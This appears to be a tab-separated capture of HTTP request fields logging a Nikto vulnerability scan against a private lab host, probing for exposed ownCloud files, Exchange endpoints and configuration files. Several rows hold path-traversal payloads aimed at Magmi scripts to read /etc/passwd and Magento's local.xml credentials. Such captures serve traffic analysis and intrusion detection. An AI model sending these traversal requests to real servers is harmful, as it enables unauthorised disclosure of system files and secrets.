http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									849						1	http://192.168.1.101/web/owncloud/data/owncloud.log		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/owncloud/data/owncloud.log
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									850						1	http://192.168.1.101/web/ownCloud/data/owncloud.log		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/ownCloud/data/owncloud.log
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									851						1	http://192.168.1.101/web/OwnCloud/data/owncloud.log		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/OwnCloud/data/owncloud.log
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									852						1	http://192.168.1.101/web/data/htaccesstest.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/data/htaccesstest.txt
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									853						1	http://192.168.1.101/web/cloud/data/htaccesstest.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/cloud/data/htaccesstest.txt
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									854						1	http://192.168.1.101/web/owncloud/data/htaccesstest.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/owncloud/data/htaccesstest.txt
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									855						1	http://192.168.1.101/web/ownCloud/data/htaccesstest.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/ownCloud/data/htaccesstest.txt
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									856						1	http://192.168.1.101/web/OwnCloud/data/htaccesstest.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/OwnCloud/data/htaccesstest.txt
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									857						1	http://192.168.1.101/web/data/owncloud.db		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/data/owncloud.db
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									858						1	http://192.168.1.101/web/cloud/data/owncloud.db		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/cloud/data/owncloud.db
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									859						1	http://192.168.1.101/web/owncloud/data/owncloud.db		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/owncloud/data/owncloud.db
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									860						1	http://192.168.1.101/web/ownCloud/data/owncloud.db		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/ownCloud/data/owncloud.db
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									861						1	http://192.168.1.101/web/OwnCloud/data/owncloud.db		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006752)				/web/OwnCloud/data/owncloud.db
																	Keep-Alive		36	36	application/x-www-form-urlencoded						192.168.1.101									862						1	http://192.168.1.101/web/Providers/HtmlEditorProviders/Fck/fcklinkgallery.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006816)				/web/Providers/HtmlEditorProviders/Fck/fcklinkgallery.aspx
																	Keep-Alive		726,714	726,714							192.168.1.101															1	http://192.168.1.101/web/flex2gateway/httpsecure		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006992)				/web/flex2gateway/httpsecure
																	Keep-Alive		726,714	726,714							192.168.1.101															1	http://192.168.1.101/web/flex2gateway/amf		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006992)				/web/flex2gateway/amf
																	Keep-Alive		726,714	726,714							192.168.1.101															1	http://192.168.1.101/web/flex2gateway/amfpolling		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006992)				/web/flex2gateway/amfpolling
																	Keep-Alive		726,714	726,714							192.168.1.101															1	http://192.168.1.101/web/samples/messagebroker/httpsecure		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006992)				/web/samples/messagebroker/httpsecure
																	Keep-Alive		726,714	726,714							192.168.1.101															1	http://192.168.1.101/web/lcds-samples/messagebroker/http		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006992)				/web/lcds-samples/messagebroker/http
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101															1	http://192.168.1.101/web/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									943						1	http://192.168.1.101/web/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									945						1	http://192.168.1.101/web/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									947						1	http://192.168.1.101/web/magento/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/magento/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									949						1	http://192.168.1.101/web/magento/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/magento/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									951						1	http://192.168.1.101/web/shop/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/shop/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									953						1	http://192.168.1.101/web/shop/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007045)				/web/shop/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									955						1	http://192.168.1.101/web/web/download_file.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007046)				/web/web/download_file.php?file=../../../../../../../../../../../etc/passwd
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									957						1	http://192.168.1.101/web/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007046)				/web/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									959						1	http://192.168.1.101/web/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007046)				/web/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									961						1	http://192.168.1.101/web/magento/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007046)				/web/magento/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									963						1	http://192.168.1.101/web/magento/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007046)				/web/magento/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									965						1	http://192.168.1.101/web/shop/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007046)				/web/shop/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									967						1	http://192.168.1.101/web/shop/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007046)				/web/shop/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									969						1	http://192.168.1.101/web/web/download_file.php?file=../../app/etc/local.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007047)				/web/web/download_file.php?file=../../app/etc/local.xml
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									971						1	http://192.168.1.101/web/magmi/web/download_file.php?file=../../app/etc/local.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007047)				/web/magmi/web/download_file.php?file=../../app/etc/local.xml
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									973						1	http://192.168.1.101/web/magmi-importer/web/download_file.php?file=../../app/etc/local.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007047)				/web/magmi-importer/web/download_file.php?file=../../app/etc/local.xml
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									975						1	http://192.168.1.101/web/magento/magmi/web/download_file.php?file=../../app/etc/local.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007047)				/web/magento/magmi/web/download_file.php?file=../../app/etc/local.xml
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									977						1	http://192.168.1.101/web/magento/magmi-importer/web/download_file.php?file=../../app/etc/local.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007047)				/web/magento/magmi-importer/web/download_file.php?file=../../app/etc/local.xml
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									979						1	http://192.168.1.101/web/shop/magmi/web/download_file.php?file=../../app/etc/local.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007047)				/web/shop/magmi/web/download_file.php?file=../../app/etc/local.xml
																	Keep-Alive		714	714	application/x-www-form-urlencoded						192.168.1.101									981						1	http://192.168.1.101/web/shop/magmi-importer/web/download_file.php?file=../../app/etc/local.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007047)				/web/shop/magmi-importer/web/download_file.php?file=../../app/etc/local.xml
																	Keep-Alive		164	164	application/x-www-form-urlencoded						192.168.1.101									983						1	http://192.168.1.101/web/scgi-bin/platform.cgi		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007077)				/web/scgi-bin/platform.cgi
																	Keep-Alive		164	164	application/x-www-form-urlencoded						192.168.1.101									984						1	http://192.168.1.101/web//WEB-INF/web.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007152)				/web//WEB-INF/web.xml
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)				/
																	Keep-Alive										192.168.1.101									991						1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:getinfo)				/web/
																	Keep-Alive										192.168.1.101									994						1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/
																	Keep-Alive										192.168.1.101									997						1	http://192.168.1.101/web/jfX7Xuf5._		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5._
																	Keep-Alive										192.168.1.101									1000						1	http://192.168.1.101/web/jfX7Xuf5		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5
																	Keep-Alive										192.168.1.101									1002						1	http://192.168.1.101/web/jfX7Xuf5.idc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.idc
																	Keep-Alive										192.168.1.101									1004						1	http://192.168.1.101/web/jfX7Xuf5.ncf		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.ncf
																	Keep-Alive										192.168.1.101									1006						1	http://192.168.1.101/web/jfX7Xuf5.exe		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.exe
																	Keep-Alive										192.168.1.101									1008						1	http://192.168.1.101/web/jfX7Xuf5/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5/
																	Keep-Alive										192.168.1.101									1010						1	http://192.168.1.101/web/jfX7Xuf5.htw		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.htw
																	Keep-Alive										192.168.1.101									1012						1	http://192.168.1.101/web/jfX7Xuf5.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.dll
																	Keep-Alive										192.168.1.101									1014						1	http://192.168.1.101/web/jfX7Xuf5.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.jsp
																	Keep-Alive										192.168.1.101									1015						1	http://192.168.1.101/web/jfX7Xuf5.cfg		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.cfg
																	Keep-Alive										192.168.1.101									1016						1	http://192.168.1.101/web/.jfX7Xuf5		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/.jfX7Xuf5
																	Keep-Alive										192.168.1.101									1017						1	http://192.168.1.101/web/jfX7Xuf5.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.xml
																	Keep-Alive										192.168.1.101									1018						1	http://192.168.1.101/web/jfX7Xuf5.class		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.class
																	Keep-Alive										192.168.1.101									1019						1	http://192.168.1.101/web/jfX7Xuf5.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.php
																	Keep-Alive										192.168.1.101									1020						1	http://192.168.1.101/web/jfX7Xuf5.		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.
																	Keep-Alive										192.168.1.101									1021						1	http://192.168.1.101/web/jfX7Xuf5.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.cfm
																	Keep-Alive										192.168.1.101									1022						1	http://192.168.1.101/web/jfX7Xuf5.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.ini
																	Keep-Alive										192.168.1.101									1023						1	http://192.168.1.101/web/jfX7Xuf5.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.asp
																	Keep-Alive										192.168.1.101									1024						1	http://192.168.1.101/web/jfX7Xuf5.dpgs		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.dpgs
																	Keep-Alive										192.168.1.101									1025						1	http://192.168.1.101/web/jfX7Xuf5.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.htm
																	Keep-Alive										192.168.1.101									1026						1	http://192.168.1.101/web/jfX7Xuf5.phtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.phtml
																	Keep-Alive										192.168.1.101									1027						1	http://192.168.1.101/web/jfX7Xuf5.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.cgi
																	Keep-Alive										192.168.1.101									1028						1	http://192.168.1.101/web/jfX7Xuf5.CGI		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.CGI
																	Keep-Alive										192.168.1.101									1029						1	http://192.168.1.101/web/jfX7Xuf5.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.html
																	Keep-Alive										192.168.1.101									1030						1	http://192.168.1.101/web/jfX7Xuf5.EXE		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/jfX7Xuf5.EXE
																	Keep-Alive										192.168.1.101									1031						1	http://192.168.1.101/web/index.php?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)				/web/index.php?
																	Keep-Alive										192.168.1.101									1032						1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:paths)				/web/
																	Keep-Alive										192.168.1.101									1033						1	http://192.168.1.101/web/clientaccesspolicy.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:clientaccesspolicy)				/web/clientaccesspolicy.xml
																	Keep-Alive										192.168.1.101									1035						1	http://192.168.1.101/web/crossdomain.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:crossdomain)				/web/crossdomain.xml
																	Keep-Alive										192.168.1.101									1036						1	http://192.168.1.101/web/robots.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:robots)				/web/robots.txt
application/whatever; q=1.0																	Keep-Alive										192.168.1.101									1037						1	http://192.168.1.101/web/index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:negotiate)				/web/index
																	Keep-Alive										192.168.1.101									1038						1	http://192.168.1.101/web		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:origin_reflection)				/web
																	Keep-Alive										192.168.1.101									1039						1	http://192.168.1.101/web		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:origin_reflection)				/web
																	Keep-Alive										192.168.1.101									1040						1	http://192.168.1.101/web/index.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: Translate-f #1)				/web/index.asp
																	Keep-Alive										192.168.1.101									1041						1	http://192.168.1.101/web/junk999.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: Translate-f #1)				/web/junk999.asp
																	Keep-Alive										192.168.1.101									1042						1	http://192.168.1.101/web/index.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: Translate-f #1)				/web/index.aspx
																	Keep-Alive										192.168.1.101									1043						1	http://192.168.1.101/web/junk988.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: Translate-f #1)				/web/junk988.aspx
																	Keep-Alive										192.168.1.101									1044						1	http://192.168.1.101/web/login.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: Translate-f #1)				/web/login.asp
																	Keep-Alive										192.168.1.101									1045						1	http://192.168.1.101/web/login.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: Translate-f #1)				/web/login.aspx
																	Keep-Alive																			1046						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/
																	Keep-Alive																			1047						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/images
																	Keep-Alive																			1050						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/Autodiscover/Autodiscover.xml
																	Keep-Alive																			1051						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/Autodiscover/
																	Keep-Alive																			1052						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/Microsoft-Server-ActiveSync
																	Keep-Alive																			1053						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/Microsoft-Server-ActiveSync/default.css
																	Keep-Alive																			1054						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/ECP
																	Keep-Alive																			1055						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/EWS
																	Keep-Alive																			1056						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/EWS/Exchange.asmx
																	Keep-Alive																			1057						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/Exchange
																	Keep-Alive																			1058						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/OWA
																	Keep-Alive																			1059						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/Microsoft-Server-ActiveSync/default.eas
																	Keep-Alive																			1060						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/Rpc
																	Keep-Alive																			1061						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/EWS/Services.wsdl
																	Keep-Alive																			1062						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/ecp
																	Keep-Alive																			1063						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/OAB
																	Keep-Alive																			1064						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/aspnet_client
																	Keep-Alive																			1065						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: IIS internal IP)				/web/PowerShell
																	Keep-Alive																			1066						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: WebLogic internal IP)				/web.
	deflate, gzip																Keep-Alive										192.168.1.101									1067						1	http://192.168.1.101/web/		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:headers: BREACH Test)				/web/
																	Keep-Alive																			1068						1			GET				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:@TESTID)				/web/
